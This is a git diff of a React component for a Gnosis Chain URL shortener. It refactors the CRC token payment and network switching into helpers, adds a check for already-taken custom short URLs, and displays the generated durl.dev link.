@@ -2,15 +2,15 @@ import { useState } from 'react';
 import { ethers } from 'ethers';
 import abi from '../abi_xDAI.json';
 import { ShowToast } from './utils/ShowToast';
-import { switchToGnosis} from 'utils/NetworkSwitcher';
+import { switchToGnosis } from 'utils/NetworkSwitcher';
+import { CRCPaymentProvider } from 'contractMethods/CRCPaymentProvider';
 
 const CONTRACT_ADDRESS = process.env.REACT_APP_CONTRACT_ADDRESS as string;
 const PROJECT_URL = process.env.REACT_APP_PROJECT_URL as string;
 
-const CRC_TOKEN_ADDRESS = '0xc15cbda9e25f98043facac170d74b569971293b2';
-const CRC_PAYMENT_RECEIVER = '0x266c002fd57f76138daaf2c107202377e4c3b5a7';
+var CRC_PAYMENT_RECEIVER = '0x266C002fd57F76138dAAf2c107202377e4C3B5A7';
+
 const CRC_PAYMENT_AMOUNT = '5';
-const GNOSIS_CHAIN_ID = '0x64';
 
 export function UrlForms() {
     const [originalUrl, setOriginalUrl] = useState('');
@@ -39,39 +39,15 @@ export function UrlForms() {
         return true;
     }
 
-    async function switchToGnosis() {
-        try {
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: GNOSIS_CHAIN_ID }],
-            });
-        } catch (err: any) {
-            if (err.code === 4902) {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [
-                        {
-                            chainId: GNOSIS_CHAIN_ID,
-                            chainName: 'Gnosis Chain',
-                            nativeCurrency: { name: 'xDAI', symbol: 'xDAI', decimals: 18 },
-                            rpcUrls: ['https://rpc.gnosischain.com'],
-                            blockExplorerUrls: ['https://gnosisscan.io'],
-                        },
-                    ],
-                });
-            } else {
-                throw err;
-            }
-        }
-    }
+    const [shortUrlExistsError, setShortUrlExistsError] = useState(false);
 
     async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
         e.preventDefault();
+        setShortUrlExistsError(false);
         if (!validateInputUrl()) return;
 
         if (CRCVersion && !/^\/.*/.test(shortUrl)) {
             setUrlInvalid(true);
-            ShowToast('Short URL must start with `/` (e.g., /custom)', 'danger');
             return;
         }
 
@@ -81,67 +57,80 @@ export function UrlForms() {
         }
 
         try {
-            setStatus('Requesting wallet access...');
-
-            if (CRCVersion) {
-                await switchToGnosis();
-                setStatus('Requesting wallet access...');
-
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const provider = new ethers.BrowserProvider(window.ethereum);
-                const signer = await provider.getSigner();
-                const CirclesAddress = signer.getAddress();
-                setStatus('Paying with CRC...');
-                const erc20Abi = [
-                    'function transfer(address to, uint256 amount) public returns (bool)',
-                    'function decimals() public view returns (uint8)',
-                ];
-                const token = new ethers.Contract(CRC_TOKEN_ADDRESS, erc20Abi, signer);
-                const decimals = await token.decimals();
-                const amount = ethers.parseUnits(CRC_PAYMENT_AMOUNT, decimals);
-
-                const transferTx = await token.transfer(CRC_PAYMENT_RECEIVER, amount);
-                await transferTx.wait();
-
-                ShowToast(`Paid ${CRC_PAYMENT_AMOUNT} CRC successfully.`, 'success');
-            }
-
             setStatus('Switching to Gnosis...');
             await switchToGnosis();
-
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
-
-            setStatus('Sending URL to blockchain...');
-            const gnosisProvider = new ethers.BrowserProvider(window.ethereum);
-            const gnosisSigner = await gnosisProvider.getSigner();
-            const contract = new ethers.Contract(CONTRACT_ADDRESS, abi, gnosisSigner);
-
-            let tx;
-            if (CRCVersion) {
-                const customId = shortUrl.slice(1); // strip leading "/"
-                tx = await contract.createCustomShortUrl(customId, originalUrl);
-            } else {
-                tx = await contract.generateShortUrl(originalUrl);
+            if (await signer.getAddress() == CRC_PAYMENT_RECEIVER){
+                CRC_PAYMENT_RECEIVER = '0x4335b31e5747ad4678348589e44513ce39ea0466';
             }
+            const contract = new ethers.Contract(CONTRACT_ADDRESS, abi, signer);
 
-            const receipt = await tx.wait();
-            const iface = new ethers.Interface(abi);
-            const parsedLog = receipt.logs
-                .map((log: { topics: string[]; data: string }) => {
-                    try {
-                        return iface.parseLog(log);
-                    } catch {
-                        return null;
-                    }
-                })
-                .find((log: any) => log?.name === 'ShortUrlCreated');
+            if (CRCVersion) {
+                const customId = shortUrl.slice(1);
 
-            const shortId = parsedLog?.args?.shortId;
-            setGeneratedShortId(shortId);
-            setTxHash(receipt.hash);
-            setStatus('Confirmed in block ' + receipt.blockNumber);
+                const exists = await contract.shortIdExists(customId);
+                if (exists) {
+                    setShortUrlExistsError(true);
+                    return;
+                }
+
+                setStatus('Requesting wallet access...');
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                setStatus('Paying with CRC...');
+                const TxCRC = CRCPaymentProvider(signer, CRC_PAYMENT_AMOUNT, CRC_PAYMENT_RECEIVER);
+
+                ShowToast(`Paid ${CRC_PAYMENT_AMOUNT} CRC successfully.`, 'success');
+                ShowToast(`CRC Transaction confirmed in block ${(await TxCRC).blockNumber}`, 'success');
+
+                setStatus('Sending URL to blockchain...');
+                const GasTx = await contract.createCustomShortUrl(customId, originalUrl);
+                const receipt = await GasTx.wait();
+                const iface = new ethers.Interface(abi);
+                const parsedLog = receipt.logs
+                    .map((log: { topics: string[]; data: string }) => {
+                        try {
+                            return iface.parseLog(log);
+                        } catch {
+                            return null;
+                        }
+                    })
+                    .find((log: any) => log?.name === 'ShortUrlCreated');
+
+                const shortId = parsedLog?.args?.shortId;
+                setGeneratedShortId(shortId);
+                setTxHash(receipt.hash);
+                setStatus('Confirmed in block ' + receipt.blockNumber);
+
+
+            } else {
+                setStatus('Switching to Gnosis...');
+                await switchToGnosis();
+
+                setStatus('Requesting wallet access...');
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                setStatus('Sending URL to blockchain...');
+                const tx = await contract.generateShortUrl(originalUrl);
+                const receipt = await tx.wait();
+                const iface = new ethers.Interface(abi);
+                const parsedLog = receipt.logs
+                    .map((log: { topics: string[]; data: string }) => {
+                        try {
+                            return iface.parseLog(log);
+                        } catch {
+                            return null;
+                        }
+                    })
+                    .find((log: any) => log?.name === 'ShortUrlCreated');
+
+                const shortId = parsedLog?.args?.shortId;
+                setGeneratedShortId(shortId);
+                setTxHash(receipt.hash);
+                setStatus('Confirmed in block ' + receipt.blockNumber);
+
+            }
         } catch (err: any) {
             if (err.code === 4001) {
                 setStatus('Transaction was cancelled by the user.');
@@ -192,10 +181,17 @@ export function UrlForms() {
                             onChange={(e) => {
                                 setShortUrl(e.target.value);
                                 setUrlInvalid(false);
+                                setShortUrlExistsError(false);
                             }}
                             placeholder="Short URL (e.g. /customLink)"
-                            className={`form-control mt-2 ${!/^\/.*/.test(shortUrl) ? 'is-invalid' : ''}`}
+                            className={`form-control mt-2 ${shortUrlExistsError || !/^\/.*/.test(shortUrl) ? 'is-invalid' : ''}`}
                         />
+                    )}
+
+                    {shortUrlExistsError && (
+                        <div className="invalid-feedback d-block mt-1">
+                            That short URL is already taken.
+                        </div>
                     )}
                 </div>
                 <div className="button-group mt-3">
@@ -208,6 +204,15 @@ export function UrlForms() {
             {status && <div className="alert alert-info mt-3">{status}</div>}
             {txHash && (
                 <div className="mt-2">
+                    <span>Your shortened URL: </span>
+                    <a
+                        href={`https://durl.dev/${generatedShortId}`}
+                        target="_blank"
+                        rel="noopener noreferrer"
+                        className="text-light underline"
+                    >
+                        https://durl.dev/{generatedShortId} points to {originalUrl}
+                    </a>
                     <a
                         href={`https://gnosisscan.io/tx/${txHash}`}
                         target="_blank"
@@ -216,6 +221,7 @@ export function UrlForms() {
                     >
                         View on GnosisScan
                     </a>
+
                 </div>
             )}
         </div>
